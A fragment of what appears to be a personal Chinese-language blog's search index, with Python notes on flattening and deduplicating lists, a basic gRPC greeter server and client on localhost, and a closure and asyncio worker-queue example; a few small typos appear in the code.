class="hljs-built_in">set</span>(itertools.chian(*a))) <span class="hljs-comment"># [1, 2, 3, 5, 8, 9]</span><br>test3 = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">set</span>(<span class="hljs-built_in">sum</span>(a,start=[]))) <span class="hljs-comment"># [1, 2, 3, 5, 8, 9]</span><br><span class="hljs-comment"># 解嵌套、去重、不破坏排序</span><br><span class="hljs-comment"># 方式一</span><br>new_list = []<br>test_set = <span class="hljs-built_in">set</span>()<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>m_list=[]<br><span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> i:<br><span class="hljs-keyword">if</span> m <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> test_set:<br>m_list.append(m)啊<br>test_set.add(m)<br>new_list.append(m_list)<br><span class="hljs-comment"># print(new_list)</span><br>test1 = [m <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> new_list <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> i]<br><span class="hljs-built_in">print</span>(test1) <span class="hljs-comment"># [1, 2, 3, 8, 5, 9]</span><br><span class="hljs-comment"># 方式二：</span><br>test2 = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">dict</span>.fromkeys(itertools.chain(*a)))<br><span class="hljs-built_in">print</span>(test2) <span class="hljs-comment"># [1, 2, 3, 8, 5, 9]</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【python】之使用gRPC</title>
    <link href="/2024/03/14/692python%E4%BD%BF%E7%94%A8gRPC/"/>
    <url>/2024/03/14/692python%E4%BD%BF%E7%94%A8gRPC/</url>
    
    <content type="html"><![CDATA[<h1 id="gRPC-Python调用"><a href="#gRPC-Python调用" class="headerlink" title="gRPC Python调用"></a>gRPC Python调用</h1><p>通过一个简单的工作示例使用 Python 中的 gRPC。</p><h2 id="1-、定义rpc-接口-proto文件-hello-proto"><a href="#1-、定义rpc-接口-proto文件-hello-proto" class="headerlink" title="1 、定义rpc 接口 ,proto文件 hello.proto"></a>1 、定义rpc 接口 ,proto文件 hello.proto</h2><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs protobuf">syntax = <span class="hljs-string">&quot;proto3&quot;</span>;<br><br><span class="hljs-keyword">option</span> go_package=<span class="hljs-string">&quot;../proto&quot;</span>;<br><br><span class="hljs-keyword">service </span><span class="hljs-title class_">Greeter</span> &#123;<br>  <span class="hljs-comment">// Sends a greeting</span><br>    <span class="hljs-function"><span class="hljs-keyword">rpc</span> SayHello (HelloRequest) <span class="hljs-keyword">returns</span> (HelloReply) </span>&#123;&#125; <span class="hljs-comment">// 定义rpc接口</span><br>  <span class="hljs-comment">// Sends another greeting  如果还要加就在下面添加 rpc</span><br>    <span class="hljs-comment">// rpc SayHelloAgain (HelloRequest) returns (HelloReply) &#123;&#125;</span><br>&#125;<br><br><span class="hljs-comment">// The request message containing the user&#x27;s name. 定义请求</span><br><span class="hljs-keyword">message </span><span class="hljs-title class_">HelloRequest</span> &#123;<br>    <span class="hljs-type">string</span> name = <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-comment">// The response message containing the greetings，定义响应</span><br><span class="hljs-keyword">message </span><span class="hljs-title class_">HelloReply</span> &#123;<br>    <span class="hljs-type">string</span> message = <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2、安装对应的库"><a href="#2、安装对应的库" class="headerlink" title="2、安装对应的库"></a>2、安装对应的库</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pip install  grpcio、pip install grpcio-tools、pip install grpc <br></code></pre></td></tr></table></figure><h2 id="3、生成py代码"><a href="#3、生成py代码" class="headerlink" title="3、生成py代码"></a>3、生成py代码</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -m grpc_tools.protoc -I . --python_out=. --grpc_python_out=. hello.proto <br></code></pre></td></tr></table></figure><h2 id="4、得到两个文件hello-pb2-py-和-hello-pb2-grpc-py"><a href="#4、得到两个文件hello-pb2-py-和-hello-pb2-grpc-py" class="headerlink" title="4、得到两个文件hello_pb2.py 和 hello_pb2_grpc.py"></a>4、得到两个文件hello_pb2.py 和 hello_pb2_grpc.py</h2><p><code>hello_pb2.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># Generated by the protocol buffer compiler.  DO NOT EDIT!</span><br><span class="hljs-comment"># source: hello.proto</span><br><span class="hljs-comment"># Protobuf Python Version: 4.25.1</span><br><span class="hljs-string">&quot;&quot;&quot;Generated protocol buffer code.&quot;&quot;&quot;</span><br><span class="hljs-keyword">from</span> google.protobuf <span class="hljs-keyword">import</span> descriptor <span class="hljs-keyword">as</span> _descriptor<br><span class="hljs-keyword">from</span> google.protobuf <span class="hljs-keyword">import</span> descriptor_pool <span class="hljs-keyword">as</span> _descriptor_pool<br><span class="hljs-keyword">from</span> google.protobuf <span class="hljs-keyword">import</span> symbol_database <span class="hljs-keyword">as</span> _symbol_database<br><span class="hljs-keyword">from</span> google.protobuf.internal <span class="hljs-keyword">import</span> builder <span class="hljs-keyword">as</span> _builder<br><span class="hljs-comment"># @@protoc_insertion_point(imports)</span><br><br>_sym_db = _symbol_database.Default()<br><br><br><br><br>DESCRIPTOR = _descriptor_pool.Default().AddSerializedFile(<span class="hljs-string">b&#x27;\n\x0bhello.proto\&quot;\x1c\n\x0cHelloRequest\x12\x0c\n\x04name\x18\x01 \x01(\t\&quot;\x1d\n\nHelloReply\x12\x0f\n\x07message\x18\x01 \x01(\t23\n\x07Greeter\x12(\n\x08SayHello\x12\r.HelloRequest\x1a\x0b.HelloReply\&quot;\x00\x42\nZ\x08../protob\x06proto3&#x27;</span>)<br><br>_<span class="hljs-built_in">globals</span> = <span class="hljs-built_in">globals</span>()<br>_builder.BuildMessageAndEnumDescriptors(DESCRIPTOR, _<span class="hljs-built_in">globals</span>)<br>_builder.BuildTopDescriptorsAndMessages(DESCRIPTOR, <span class="hljs-string">&#x27;hello_pb2&#x27;</span>, _<span class="hljs-built_in">globals</span>)<br><span class="hljs-keyword">if</span> _descriptor._USE_C_DESCRIPTORS == <span class="hljs-literal">False</span>:<br>  _<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;DESCRIPTOR&#x27;</span>]._options = <span class="hljs-literal">None</span><br>  _<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;DESCRIPTOR&#x27;</span>]._serialized_options = <span class="hljs-string">b&#x27;Z\010../proto&#x27;</span><br>  _<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;_HELLOREQUEST&#x27;</span>]._serialized_start=<span class="hljs-number">15</span><br>  _<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;_HELLOREQUEST&#x27;</span>]._serialized_end=<span class="hljs-number">43</span><br>  _<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;_HELLOREPLY&#x27;</span>]._serialized_start=<span class="hljs-number">45</span><br>  _<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;_HELLOREPLY&#x27;</span>]._serialized_end=<span class="hljs-number">74</span><br>  _<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;_GREETER&#x27;</span>]._serialized_start=<span class="hljs-number">76</span><br>  _<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;_GREETER&#x27;</span>]._serialized_end=<span class="hljs-number">127</span><br><span class="hljs-comment"># @@protoc_insertion_point(module_scope)</span><br><br></code></pre></td></tr></table></figure><p><code>hello_pb2_grpc.py </code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Generated by the gRPC Python protocol compiler plugin. DO NOT EDIT!</span><br><span class="hljs-string">&quot;&quot;&quot;Client and server classes corresponding to protobuf-defined services.&quot;&quot;&quot;</span><br><span class="hljs-keyword">import</span> grpc<br><br><span class="hljs-comment"># import hello_pb2 as hello__pb2</span><br><span class="hljs-keyword">from</span> . <span class="hljs-keyword">import</span> hello_pb2 <span class="hljs-keyword">as</span> hello__pb2<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">GreeterStub</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;Missing associated documentation comment in .proto file.&quot;&quot;&quot;</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, channel</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;Constructor.</span><br><span class="hljs-string"></span><br><span class="hljs-string">        Args:</span><br><span class="hljs-string">            channel: A grpc.Channel.</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        self.SayHello = channel.unary_unary(<br>                <span class="hljs-string">&#x27;/Greeter/SayHello&#x27;</span>,<br>                request_serializer=hello__pb2.HelloRequest.SerializeToString,<br>                response_deserializer=hello__pb2.HelloReply.FromString,<br>                )<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">GreeterServicer</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;Missing associated documentation comment in .proto file.&quot;&quot;&quot;</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">SayHello</span>(<span class="hljs-params">self, request, context</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;Sends a greeting</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        context.set_code(grpc.StatusCode.UNIMPLEMENTED)<br>        context.set_details(<span class="hljs-string">&#x27;Method not implemented!&#x27;</span>)<br>        <span class="hljs-keyword">raise</span> NotImplementedError(<span class="hljs-string">&#x27;Method not implemented!&#x27;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add_GreeterServicer_to_server</span>(<span class="hljs-params">servicer, server</span>):<br>    rpc_method_handlers = &#123;<br>            <span class="hljs-string">&#x27;SayHello&#x27;</span>: grpc.unary_unary_rpc_method_handler(<br>                    servicer.SayHello,<br>                    request_deserializer=hello__pb2.HelloRequest.FromString,<br>                    response_serializer=hello__pb2.HelloReply.SerializeToString,<br>            ),<br>    &#125;<br>    generic_handler = grpc.method_handlers_generic_handler(<br>            <span class="hljs-string">&#x27;Greeter&#x27;</span>, rpc_method_handlers)<br>    server.add_generic_rpc_handlers((generic_handler,))<br><br><br> <span class="hljs-comment"># This class is part of an EXPERIMENTAL API.</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Greeter</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;Missing associated documentation comment in .proto file.&quot;&quot;&quot;</span><br><br><span class="hljs-meta">    @staticmethod</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">SayHello</span>(<span class="hljs-params">request,</span><br><span class="hljs-params">            target,</span><br><span class="hljs-params">            options=(<span class="hljs-params"></span>),</span><br><span class="hljs-params">            channel_credentials=<span class="hljs-literal">None</span>,</span><br><span class="hljs-params">            call_credentials=<span class="hljs-literal">None</span>,</span><br><span class="hljs-params">            insecure=<span class="hljs-literal">False</span>,</span><br><span class="hljs-params">            compression=<span class="hljs-literal">None</span>,</span><br><span class="hljs-params">            wait_for_ready=<span class="hljs-literal">None</span>,</span><br><span class="hljs-params">            timeout=<span class="hljs-literal">None</span>,</span><br><span class="hljs-params">            metadata=<span class="hljs-literal">None</span></span>):<br>        <span class="hljs-keyword">return</span> grpc.experimental.unary_unary(request, target, <span class="hljs-string">&#x27;/Greeter/SayHello&#x27;</span>,<br>            hello__pb2.HelloRequest.SerializeToString,<br>            hello__pb2.HelloReply.FromString,<br>            options, channel_credentials,<br>            insecure, call_credentials, compression, wait_for_ready, timeout, metadata)<br><br></code></pre></td></tr></table></figure><h2 id="5、根目录定义server-py文件，作为启动服务端"><a href="#5、根目录定义server-py文件，作为启动服务端" class="headerlink" title="5、根目录定义server.py文件，作为启动服务端"></a>5、根目录定义server.py文件，作为启动服务端</h2><p><code>server.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">import</span> grpc<br><span class="hljs-keyword">from</span> concurrent <span class="hljs-keyword">import</span> futures<br><span class="hljs-comment"># import proto.stream_pb2 as stream_pb2</span><br><span class="hljs-comment"># import proto.stream_pb2_grpc as stream_pb2_grpc</span><br><br><span class="hljs-keyword">from</span> proto <span class="hljs-keyword">import</span> hello_pb2, hello_pb2_grpc<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> base64<br><br><br><span class="hljs-comment"># 继承 hello_pb2_grpc里面的 GreeterServicer 创建服务类，必须实现GreeterServicer里面的方法</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyGreeterServicer</span>(hello_pb2_grpc.GreeterServicer):<br>    <span class="hljs-comment"># 定义服务，这个服务接收请求，返回响应</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">SayHello</span>(<span class="hljs-params">self, request, context</span>):<br>        <span class="hljs-comment"># 在这里处理客户端的请求，并生成相应的响应数据</span><br>        <span class="hljs-built_in">print</span>(request)  <span class="hljs-comment"># request是请求，</span><br>        <span class="hljs-comment"># 请求进来后这里可以写逻辑去处理请求，比如说判断计算之类的</span><br>        response_str = <span class="hljs-string">f&quot;Hello, <span class="hljs-subst">&#123;request.name&#125;</span>&quot;</span>  <span class="hljs-comment"># 把请求处理一下，等下返回出去，</span><br>        <span class="hljs-comment"># 这里的request.name是因为你proto里定义的就是这个，发过来的 request是HelloRequest类型，</span><br>        <span class="hljs-comment"># 内容是name:&quot;输入的内容&quot;，所以你要用request.name去拿到这个请求传入的内容</span><br><br>        response = hello_pb2.HelloReply(message=<span class="hljs-string">f&quot;response: <span class="hljs-subst">&#123;response_str&#125;</span>&quot;</span>)  <span class="hljs-comment"># 定义响应，返回出去</span><br>        <span class="hljs-keyword">return</span> response<br><br><br><span class="hljs-comment"># 启动服务</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run_server</span>():<br>    server = grpc.server(futures.ThreadPoolExecutor(max_workers=<span class="hljs-number">10</span>))  <span class="hljs-comment"># 设置服务线程，</span><br>    hello_pb2_grpc.add_GreeterServicer_to_server(MyGreeterServicer(), server)  <span class="hljs-comment"># 服务添加进去</span><br>    server.add_insecure_port(<span class="hljs-string">&#x27;[::]:50051&#x27;</span>)  <span class="hljs-comment"># 定义服务端口</span><br>    server.start()  <span class="hljs-comment"># 开启服务</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;started server&quot;</span>)  <span class="hljs-comment"># 打印一下确定服务开启了</span><br>    server.wait_for_termination()  <span class="hljs-comment"># 等待终止，就是关闭</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    run_server()<br><br></code></pre></td></tr></table></figure><h2 id="6、根目录定义client-py文件，作为客户端去连接服务端"><a href="#6、根目录定义client-py文件，作为客户端去连接服务端" class="headerlink" title="6、根目录定义client.py文件，作为客户端去连接服务端"></a>6、根目录定义client.py文件，作为客户端去连接服务端</h2><p><code>client.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">import</span> grpc<br><span class="hljs-comment"># import stream_pb2</span><br><span class="hljs-keyword">from</span> proto <span class="hljs-keyword">import</span> hello_pb2, hello_pb2_grpc<br><br><br><span class="hljs-comment"># import stream_pb2_grpc</span><br><br><span class="hljs-comment"># 启动客户端，与服务端进行连接，且发送请求</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run_client</span>():<br>    <span class="hljs-comment"># wit 上下文打开会自动关闭，</span><br><br>    <span class="hljs-comment"># channel = grpc.insecure_channel(&#x27;localhost:50051&#x27;)  # 如果不写with 就是这样接收</span><br>    <span class="hljs-keyword">with</span> grpc.insecure_channel(<span class="hljs-string">&#x27;localhost:50051&#x27;</span>) <span class="hljs-keyword">as</span> channel:<br>        stub = hello_pb2_grpc.GreeterStub(channel)  <span class="hljs-comment"># 得到存根，存根就是代理，由这个代理去发送你的请求</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;stub:&quot;</span>, stub)  <span class="hljs-comment"># 打印下存根，确保代理建立</span><br>        request = hello_pb2.HelloRequest(name=<span class="hljs-string">&#x27;Tom&#x27;</span>)  <span class="hljs-comment"># 定义要向服务端发送的内容</span><br>        <span class="hljs-comment"># 这里同样要注意因为你proto里面定义的 请求的字段名就是name 所以必须用name=&#x27;你要传的内容&#x27;的形式去包装请求，服务端才能识别</span><br><br>        response = stub.SayHello(request)  <span class="hljs-comment"># 得到响应 与res = requests.get(url)一个意思</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Received response:&#x27;</span>, response.message)<br>        <span class="hljs-comment"># 打印响应 也是同理，因为你proto里定义返回的字段名 所以必须用response.message去取这个值</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    run_client()<br>    <span class="hljs-comment"># # Get the returned data from the trailing metadata</span><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【python】闭包之回调函数异步应用场景</title>
    <link href="/2024/03/05/693python%E4%B9%8B%E9%97%AD%E5%8C%85%E4%B9%8B%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0%E5%BC%82%E6%AD%A5%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/"/>
    <url>/2024/03/05/693python%E4%B9%8B%E9%97%AD%E5%8C%85%E4%B9%8B%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0%E5%BC%82%E6%AD%A5%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="python-闭包函数-的用途"><a href="#python-闭包函数-的用途" class="headerlink" title="python 闭包函数 的用途"></a>python 闭包函数 的用途</h1><p>闭包函数在Python中有多种用途，下面是一些常见的应用场景：</p><ol><li>封装数据：闭包函数可以用于创建对象的私有变量，将变量隐藏在函数内部，只能通过特定的函数访问和修改。这样可以避免全局变量的污染，并增加代码的封装性和安全性。</li><li>保留状态：闭包函数可以捕获并保留其定义时的上下文环境。这意味着函数可以记住其被创建时的状态，可以在后续调用中继续使用这些状态。这在需要保持持久状态的场景中非常有用，比如计数器、缓存、历史记录等。</li><li>实现装饰器：闭包函数常用于实现装饰器，装饰器是一种修改函数行为的技术。通过在函数定义前使用装饰器语法，可以在不修改原始函数代码的情况下，为函数添加额外的功能，比如日志记录、性能分析、输入验证等。</li><li>实现回调函数：闭包函数可以用作回调函数，即将一个函数作为参数传递给另一个函数，以在适当的时候进行调用。回调函数常用于异步编程、事件处理和触发器等场景，通过闭包函数可以方便地传递上下文和状态信息。</li><li>延迟计算：闭包函数可以用于实现延迟计算，即将计算推迟到稍后的时候再进行。闭包函数可以捕获所需的变量和表达式，并在需要时进行计算。这对于处理大数据集或复杂计算的情况下，可以提高效率和性能。</li></ol><p>总之，闭包函数提供了一种灵活而强大的编程工具，可以用于实现许多有用的功能和模式。它们能够捕获上下文环境并保留状态，使得函数能够具有更多的能力和特性。</p><p>闭包概念与回调函数在异步上传文件时的应用场景代码示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">import</span> asyncio<br><br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">upload_file</span>(<span class="hljs-params">file_path</span>):<br>    <span class="hljs-comment"># 模拟上传文件的操作</span><br>    <span class="hljs-comment"># 实际应该调用上传文件的方法，返回任务ID</span><br>    <span class="hljs-keyword">await</span> asyncio.sleep(<span class="hljs-number">1</span>)  <span class="hljs-comment"># 模拟上传的耗时操作</span><br>    task_id = file_path  <span class="hljs-comment"># 这里假设任务ID就是文件路径</span><br>    <span class="hljs-keyword">return</span> task_id<br><br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">parse_file</span>(<span class="hljs-params">task_id</span>):<br>    <span class="hljs-comment"># 模拟解析文件的操作</span><br>    <span class="hljs-comment"># 实际应该根据任务ID执行相应的解析操作</span><br>    <span class="hljs-keyword">await</span> asyncio.sleep(<span class="hljs-number">1</span>)  <span class="hljs-comment"># 模拟解析的耗时操作</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;解析文件 <span class="hljs-subst">&#123;task_id&#125;</span>&#x27;</span>)<br><br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">upload_worker</span>(<span class="hljs-params">queue, result_queue</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        file_path = <span class="hljs-keyword">await</span> queue.get()<br>        task_id = <span class="hljs-keyword">await</span> upload_file(file_path)<br>        <span class="hljs-keyword">await</span> result_queue.put(task_id)<br>        queue.task_done()<br><br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">parse_worker</span>(<span class="hljs-params">result_queue</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        task_id = <span class="hljs-keyword">await</span> result_queue.get()<br>        <span class="hljs-keyword">await</span> parse_file(task_id)<br>        result_queue.task_done()<br><br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    file_paths = [<span class="hljs-string">f&#x27;/path/to/file<span class="hljs-subst">&#123;i&#125;</span>&#x27;</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>)]  <span class="hljs-comment"># 文件路径列表</span><br><br>    queue = asyncio.Queue()<br>    result_queue = asyncio.Queue()<br><br>    <span class="hljs-comment"># 创建上传任务</span><br>    upload_tasks = []<br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):  <span class="hljs-comment"># 可根据需求调整并发数</span><br>        task = asyncio.create_task(upload_worker(queue, result_queue))<br>        upload_tasks.append(task)<br><br>    <span class="hljs-comment"># 创建解析任务</span><br>    parse_tasks = []<br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):  <span class="hljs-comment"># 可根据需求调整并发数</span><br>        task = asyncio.create_task(parse_worker(result_queue))<br>        parse_tasks.append(task)<br><br>    <span class="hljs-comment"># 将文件路径放入队列</span><br>    <span class="hljs-keyword">for</span> file_path <span class="hljs-keyword">in</span> file_paths:<br>        <span class="hljs-keyword">await</span> queue.put(file_path)<br><br>    <span class="hljs-comment"># 等待所有文件上传完成</span><br>    <span class="hljs-keyword">await</span> queue.join()<br><br>    <span class="hljs-comment"># 结束上传任务</span><br>    <span class="hljs-keyword">for</span> task <span class="hljs-keyword">in</span> upload_tasks:<br>        task.cancel()<br><br>    <span class="hljs-comment"># 等待所有解析任务完成</span><br>    <span class="hljs-keyword">await</span> result_queue.join()<br><br>    <span class="hljs-comment"># 结束解析任务</span><br>    <span class="hljs-keyword">for</span> task <span class="hljs-keyword">in</span> parse_tasks:<br>        task.cancel()<br><br>asyncio.run(main())<br><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
